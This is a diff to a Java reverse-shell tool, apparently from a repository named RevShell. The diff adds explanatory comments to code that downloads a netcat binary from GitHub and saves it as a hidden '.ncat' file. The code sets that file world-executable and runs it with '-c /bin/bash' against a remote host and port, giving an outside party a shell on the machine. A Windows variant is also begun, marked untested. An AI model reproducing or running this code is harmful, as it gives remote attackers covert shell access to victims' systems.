@@ -17,30 +17,39 @@ public class revShellSmall {
 	 * In Linux create a new (hidden) netcat executable and execute it
 	 */
 	private static boolean linCreate() throws IOException {
+ 		//Get system architecture and present working direcectory
 		String arch = System.getProperty("os.arch");
 		String pwd = System.getProperty("user.dir");
+		//Instantiate website
 		URL website = null;
 
-		//Detect OS
+		//Check for 64 / 32 bit and then set website accordingly //TODO dynamic version if this fails
 		if(arch.contains("64") || arch.contains("x86")){
 			website = new URL("https://github.com/Hashdump/RevShell/raw/experimental/Resources/ncat64");
 		}else{
 			website = new URL("https://github.com/Hashdump/RevShell/raw/experimental/Resources/ncat32");
 		}
+		//Create byte channel for creating binary
 		ReadableByteChannel rbc = Channels.newChannel(website.openStream());
+		//Write to .ncat so that it is a hidden file
 		FileOutputStream fos = new FileOutputStream(".ncat");
+		//Transfer data then close fos
 		fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
 		fos.close();
+		//Open netcat file
 		File ncat = new File(".ncat");
+		//Delete on exit so if something goes wrong
 		ncat.deleteOnExit();
+		//Set to chmod 777
 		ncat.setExecutable(true, false);
 		ncat.setReadable(true, false);
 		ncat.setWritable(true, false);
 
-
+		//Set up runtime to run executable
 		Runtime r = Runtime.getRuntime();
 		Process p = null;
 		try {
+			//Execute .ncat -c /bin/bash host port
 			p = r.exec(pwd + "/.ncat -c /bin/bash " + host + " " + port);
 		} catch (IOException e) {
 			e.printStackTrace();
@@ -59,7 +68,9 @@ public class revShellSmall {
 
 	/*
 	 * In Windows create a new (hidden) netcat executable and execute it
+	 * NOT TESTED
 	 */
+	//TODO Testing
 	private static boolean winCreate() throws IOException {
 		String pwd = System.getProperty("user.dir");
 		URL website = null;
